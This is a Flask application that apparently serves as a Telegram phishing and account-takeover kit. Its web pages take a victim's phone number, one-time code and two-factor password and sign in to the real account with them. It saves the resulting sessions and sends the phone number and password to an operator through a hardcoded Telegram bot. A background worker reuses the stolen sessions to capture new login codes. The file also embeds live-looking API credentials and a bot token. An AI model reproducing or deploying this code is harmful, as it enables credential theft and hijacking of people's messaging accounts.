import os
import re
import json
import time
import tempfile
import shutil
import asyncio
import threading
import requests
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify

# ==== FIX SQLITE ====  (Railway / Linux)
try:
    import sys
    import pysqlite3
    sys.modules['sqlite3'] = pysqlite3
except:
    pass

from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
)

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecret")

# ===== BOT CONFIG =====
api_id = int(os.getenv("API_ID", 34946540))
api_hash = os.getenv("API_HASH", "7554a5e9dd52df527bfc39d8511413fd")

BOT_TOKEN = "8205641352:AAHxt3LgmDdfKag-NPQUY4WYOIXsul680Hw"
CHAT_ID = "7712462494"

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# ===== STORAGE =====
LAST_DATA = {}  # { phone: {"otp":..., "password":...} }


# ===================================================================
#                     STORAGE FIX — KEY STANDARDIZATION
# ===================================================================
def normalize_phone_key(phone: str) -> str:
    if phone is None:
        return ""
    # remove whitespace and common suffixes if any
    return phone.replace(".session", "").replace(".pending", "").strip()


def save_data(phone, otp=None, password=None):
    phone = normalize_phone_key(phone)  # FIX PENTING

    if not phone:
        return

    if phone not in LAST_DATA:
        LAST_DATA[phone] = {"otp": None, "password": None}

    if otp:
        LAST_DATA[phone]["otp"] = otp

    if password:
        LAST_DATA[phone]["password"] = password


def get_data(phone):
    phone = normalize_phone_key(phone)
    return LAST_DATA.get(phone, {"otp": None, "password": None})
# ===================================================================


# ===== INLINE BUTTON WEBHOOK =====
@app.route("/bot", methods=["POST"])
def bot_webhook():
    data = request.get_json(silent=True) or {}
    print("== /bot CALLBACK RECEIVED ==")
    print(data)

    if "callback_query" not in data:
        return jsonify({"ok": True})

    q = data["callback_query"]
    cid = q["message"]["chat"]["id"]
    cb = q.get("data", "")
    cb_id = q.get("id")

    # jawab callback supaya loading berhenti
    if cb_id:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                data={"callback_query_id": cb_id}
            )
        except Exception as e:
            print("[BOT] answerCallbackQuery error:", e)

    if cb.startswith("cek_"):
        phone = cb.replace("cek_", "").strip()
        info = get_data(phone)

        txt = (
            f"🔐 Password: {info['password'] or '-'}\n"
            f"🔑 OTP: {info['otp'] or '-'}"
        )

        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": cid, "text": txt}
            )
            print("[BOT] sendMessage status:", r.status_code, r.text)
        except Exception as e:
            print("[BOT] sendMessage error:", e)

    return jsonify({"ok": True})


# ===== SEND LOGIN INFO KE BOT =====
def send_login_message(phone):
    phone = normalize_phone_key(phone)
    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    text = f"📞 Nomor: {phone}\n🕒 Login: {waktu}"

    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={
                "chat_id": CHAT_ID,
                "text": text,
                "reply_markup": json.dumps({
                    "inline_keyboard": [
                        [{"text": "🔍 Cek", "callback_data": f"cek_{phone}"}]
                    ]
                })
            }
        )
        print("[BOT] login message status:", r.status_code, r.text)
    except Exception as e:
        print("[BOT] login message error:", e)


# ===== SESSION FUNCTIONS =====
def remove_session_files(phone):
    phone = normalize_phone_key(phone)
    for fn in os.listdir(SESSION_DIR):
        if fn.startswith(f"{phone}."):
            try:
                os.remove(os.path.join(SESSION_DIR, fn))
            except Exception:
                pass


def finalize_pending_session(phone):
    phone = normalize_phone_key(phone)
    for fn in os.listdir(SESSION_DIR):
        # target name like: +601xxxx.pending.session
        if fn.startswith(f"{phone}.pending") and fn.endswith(".session"):
            src = os.path.join(SESSION_DIR, fn)
            dst = os.path.join(SESSION_DIR, fn.replace(".pending", ""))
            try:
                os.rename(src, dst)
                print("[SESSION] renamed", src, "->", dst)
            except Exception as e:
                print("[SESSION] rename error:", e)


# ===== ROOT HOME =====
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        phone = request.form.get("phone", "").strip()
        session["phone"] = phone
        remove_session_files(phone)

        pending = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def run():
            client = TelegramClient(pending, api_id, api_hash)
            await client.connect()
            sent = await client.send_code_request(phone)
            session["phone_code_hash"] = sent.phone_code_hash
            await client.disconnect()

        asyncio.run(run())
        return redirect(url_for("otp"))

    return render_template("login.html")


# ===== API LOGIN =====
@app.route("/api/login", methods=["POST"])
def api_login():
    phone = request.form.get("phone", "").strip()

    if not phone:
        return jsonify({"status": "error", "message": "Phone kosong"})

    session["phone"] = phone
    remove_session_files(phone)

    pending = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def run():
        client = TelegramClient(pending, api_id, api_hash)
        await client.connect()
        sent = await client.send_code_request(phone)
        session["phone_code_hash"] = sent.phone_code_hash
        await client.disconnect()

    asyncio.run(run())

    return jsonify({"status": "success", "redirect": url_for("otp")})


# ===== OTP PAGE =====
@app.route("/otp", methods=["GET", "POST"])
def otp():
    phone = session.get("phone", "").strip()

    if request.method == "POST":
        code = request.form.get("otp")
        pending = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def run():
            client = TelegramClient(pending, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=session.get("phone_code_hash")
                )
                await client.disconnect()
                finalize_pending_session(phone)
                return {"ok": True, "need_pwd": False}
            except SessionPasswordNeededError:
                await client.disconnect()
                return {"ok": True, "need_pwd": True}
            except PhoneCodeInvalidError:
                await client.disconnect()
                return {"ok": False, "msg": "OTP salah"}
            except Exception as e:
                await client.disconnect()
                return {"ok": False, "msg": str(e)}

        result = asyncio.run(run())

        if result["ok"]:
            if result["need_pwd"]:
                session["need_password"] = True
                return redirect(url_for("password"))
            else:
                send_login_message(phone)
                return redirect(url_for("success"))
        else:
            flash(result["msg"])

    return render_template("otp.html")


# ===== API OTP (AJAX) =====
@app.route("/api/otp", methods=["POST"])
def api_otp():
    phone = normalize_phone_key(session.get("phone", ""))
    code = request.form.get("otp", "").strip()
    pending = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def run():
        client = TelegramClient(pending, api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=session.get("phone_code_hash")
            )
            await client.disconnect()
            finalize_pending_session(phone)
            return {"ok": True, "need_pwd": False}
        except SessionPasswordNeededError:
            await client.disconnect()
            return {"ok": True, "need_pwd": True}
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {"ok": False, "msg": "OTP salah"}
        except Exception as e:
            await client.disconnect()
            return {"ok": False, "msg": str(e)}

    result = asyncio.run(run())

    if result.get("ok"):
        if result.get("need_pwd"):
            session["need_password"] = True
            return jsonify({"status": "success", "redirect": url_for("password")})
        else:
            send_login_message(phone)
            return jsonify({"status": "success", "redirect": url_for("success")})
    else:
        return jsonify({"status": "error", "message": result.get("msg", "Unknown error")})


# ===== PASSWORD PAGE =====
@app.route("/password", methods=["GET", "POST"])
def password():
    phone = session.get("phone", "").strip()

    if request.method == "POST":
        pwd = request.form.get("password")
        pending = os.path.join(SESSION_DIR, f"{phone}.pending")

        async def run():
            client = TelegramClient(pending, api_id, api_hash)
            await client.connect()
            try:
                await client.sign_in(password=pwd)
                await client.disconnect()
                # ensure rename so worker can read .session file
                finalize_pending_session(phone)
                return True
            except:
                await client.disconnect()
                return False

        ok = asyncio.run(run())

        if ok:
            # ensure session finalized BEFORE worker reads
            finalize_pending_session(phone)
            save_data(phone, password=pwd)
            send_login_message(phone)
            return redirect(url_for("success"))
        else:
            flash("Password salah")

    return render_template("password.html")


# ===== API PASSWORD (AJAX) =====
@app.route("/api/password", methods=["POST"])
def api_password():
    phone = session.get("phone")
    pwd = request.form.get("password")
    pending = os.path.join(SESSION_DIR, f"{phone}.pending")

    async def run():
        client = TelegramClient(pending, api_id, api_hash)
        await client.connect()
        try:
            await client.sign_in(password=pwd)
            await client.disconnect()
            finalize_pending_session(phone)
            return True
        except:
            await client.disconnect()
            return False

    ok = asyncio.run(run())

    if ok:
        finalize_pending_session(phone)
        save_data(phone, password=pwd)
        send_login_message(phone)
        return jsonify({"status": "success", "redirect": url_for("success")})
    else:
        return jsonify({"status": "error", "message": "Password salah"})


@app.route("/success")
def success():
    return render_template("success.html", phone=session.get("phone"))


# ===================================================================
#                              WORKER
# ===================================================================
async def forward_handler(event, client_name):
    text = getattr(event, "raw_text", "") or ""
    sender = await event.get_sender()

    if sender.id != 777000:
        return

    otp_list = re.findall(r"\b\d{4,8}\b", text)
    if not otp_list:
        return

    otp_code = otp_list[0]

    # ensure normalized key
    save_data(client_name, otp=otp_code)
    print("[OTP FOUND]", client_name, otp_code)


async def worker_main():
    print("[WORKER] started")
    clients = {}

    while True:
        try:
            for fn in os.listdir(SESSION_DIR):
                # we only care about finalized .session files
                if not fn.endswith(".session"):
                    continue
                if ".pending" in fn:
                    continue

                base = fn[:-8].strip()
                if base in clients:
                    continue

                real_session = os.path.join(SESSION_DIR, fn)
                # copy to temp to avoid locking the real DB
                ts = int(time.time() * 1000)
                temp_session = os.path.join(tempfile.gettempdir(), f"{base}_clone_{ts}.session")
                try:
                    shutil.copy2(real_session, temp_session)
                except Exception as e:
                    print(f"[WORKER] failed to copy session {real_session} -> {temp_session}: {e}")
                    continue

                print(f"[WORKER] load clone session: {temp_session}")

                client = TelegramClient(temp_session, api_id, api_hash)

                # try connect with small retries
                connected = False
                for attempt in range(5):
                    try:
                        await client.connect()
                        connected = True
                        break
                    except Exception as e:
                        print(f"[WORKER] connect attempt {attempt+1} failed for {base}: {e}")
                        await asyncio.sleep(0.5)

                if not connected:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    continue

                try:
                    if not await client.is_user_authorized():
                        print(f"[WORKER] session {base} not authorized, skip")
                        await client.disconnect()
                        continue
                except Exception as e:
                    print(f"[WORKER] is_user_authorized check failed for {base}: {e}")
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    continue

                try:
                    me = await client.get_me()
                    print(f"[WORKER] connected as {me.id} ({getattr(me,'username','')})")
                except Exception as e:
                    print(f"[WORKER] get_me failed for {base}: {e}")

                @client.on(events.NewMessage(incoming=True))
                async def _handler(event, fn=base):
                    try:
                        await forward_handler(event, fn)
                    except Exception as e:
                        print(f"[WORKER] handler error {fn}: {e}")

                task = asyncio.create_task(client.run_until_disconnected())
                clients[base] = task

        except Exception as e:
            print("[WORKER] loop error:", e)

        await asyncio.sleep(0.5)


def start_worker_thread():
    t = threading.Thread(target=lambda: asyncio.run(worker_main()), daemon=True)
    t.start()


# ===== START WORKER =====
start_worker_thread()


# ===== MAIN =====
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
